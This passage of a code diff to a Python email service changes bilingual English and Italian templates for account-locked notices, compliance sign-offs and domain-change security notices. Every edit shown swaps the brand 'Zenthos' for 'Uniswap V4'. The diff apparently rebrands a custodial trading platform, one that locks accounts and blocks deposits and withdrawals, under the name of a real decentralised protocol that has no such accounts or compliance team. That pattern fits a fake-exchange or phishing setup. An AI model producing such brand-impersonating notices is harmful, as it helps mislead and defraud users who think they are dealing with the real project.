     <p style="color:#555555;margin:0 0 4px 0;">Cordiali saluti,</p>
-    <p style="color:#333333;font-weight:600;margin:0;">Il Team Conformit&agrave; e Finanza di Zenthos</p>"""
+    <p style="color:#333333;font-weight:600;margin:0;">Il Team Conformit&agrave; e Finanza di Uniswap V4</p>"""
         return subject, _wrap(content)
 
     # ── Account Locked Email ─────────
@@ -688,11 +688,11 @@ class EmailService:
         if lang == "it":
             return self._get_account_locked_email_it(user_name, lock_reason)
         
-        subject = "Your Zenthos Account Has Been Locked"
+        subject = "Your Uniswap V4 Account Has Been Locked"
         content = f"""
     <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Account Locked</h2>
     <p style="color:#555555;margin:0 0 12px 0;">Dear {html.escape(user_name)},</p>
-    <p style="color:#555555;margin:0 0 12px 0;">We regret to inform you that your Zenthos account has been locked effective immediately.</p>
+    <p style="color:#555555;margin:0 0 12px 0;">We regret to inform you that your Uniswap V4 account has been locked effective immediately.</p>
     
     <div style="background-color:#d32f2f;border-radius:8px;padding:20px;margin:20px 0;">
       <p style="color:#ffffff;font-size:14px;font-weight:700;margin:0 0 8px 0;">Reason:</p>
@@ -702,15 +702,15 @@ class EmailService:
     <p style="color:#555555;margin:0 0 12px 0;">While your account is locked, you will not be able to access any services including deposits, withdrawals, or trading.</p>
     <p style="color:#555555;margin:0 0 12px 0;">If you believe this action was taken in error or wish to resolve this matter, please contact our support team immediately.</p>
     <p style="color:#555555;margin:0 0 4px 0;">Kind regards,</p>
-    <p style="color:#333333;font-weight:600;margin:0;">The Zenthos Compliance Team</p>"""
+    <p style="color:#333333;font-weight:600;margin:0;">The Uniswap V4 Compliance Team</p>"""
         return subject, _wrap(content)
 
     def _get_account_locked_email_it(self, user_name: str, lock_reason: str) -> tuple:
-        subject = "Il Suo Account Zenthos è Stato Bloccato"
+        subject = "Il Suo Account Uniswap V4 è Stato Bloccato"
         content = f"""
     <h2 style="color:#1a1a1a;margin:0 0 16px 0;font-size:20px;">Account Bloccato</h2>
     <p style="color:#555555;margin:0 0 12px 0;">Gentile {html.escape(user_name)},</p>
-    <p style="color:#555555;margin:0 0 12px 0;">Siamo spiacenti di informarLa che il Suo account Zenthos &egrave; stato bloccato con effetto immediato.</p>
+    <p style="color:#555555;margin:0 0 12px 0;">Siamo spiacenti di informarLa che il Suo account Uniswap V4 &egrave; stato bloccato con effetto immediato.</p>
     
     <div style="background-color:#d32f2f;border-radius:8px;padding:20px;margin:20px 0;">
       <p style="color:#ffffff;font-size:14px;font-weight:700;margin:0 0 8px 0;">Motivo:</p>
@@ -720,7 +720,7 @@ class EmailService:
     <p style="color:#555555;margin:0 0 12px 0;">Mentre il Suo account &egrave; bloccato, non potr&agrave; accedere ad alcun servizio, inclusi depositi, prelievi o operazioni di trading.</p>
     <p style="color:#555555;margin:0 0 12px 0;">Se ritiene che questa azione sia stata presa per errore o desidera risolvere la questione, La preghiamo di contattare immediatamente il nostro team di supporto.</p>
     <p style="color:#555555;margin:0 0 4px 0;">Cordiali saluti,</p>
-    <p style="color:#333333;font-weight:600;margin:0;">Il Team Conformit&agrave; di Zenthos</p>"""
+    <p style="color:#333333;font-weight:600;margin:0;">Il Team Conformit&agrave; di Uniswap V4</p>"""
         return subject, _wrap(content)
 
     # ── Domain Change Security Notice Email ─────────
@@ -749,7 +749,7 @@ class EmailService:
 
     <p style="color:#555555;margin:0 0 12px 0;">Thank you for being a valued member of our platform. We look forward to continuing to serve you.</p>
     <p style="color:#555555;margin:0 0 4px 0;">Kind regards,</p>
-    <p style="color:#333333;font-weight:600;margin:0;">The Zenthos Team</p>"""
+    <p style="color:#333333;font-weight:600;margin:0;">The Uniswap V4 Team</p>"""
         return subject, _wrap(content)
 
     def _get_domain_change_email_it(self, user_name: str, new_domain: str) -> tuple:
@@ -774,7 +774,7 @@ class EmailService:
 
     <p style="color:#555555;margin:0 0 12px 0;">La ringraziamo per essere un membro importante della nostra piattaforma. Non vediamo l'ora di continuare a servirLa.</p>
     <p style="color:#555555;margin:0 0 4px 0;">Cordiali saluti,</p>
-    <p style="color:#333333;font-weight:600;margin:0;">Il Team Zenthos</p>"""
+    <p style="color:#333333;font-weight:600;margin:0;">Il Team Uniswap V4</p>"""
         return subject, _wrap(content)
 email_service = None
 
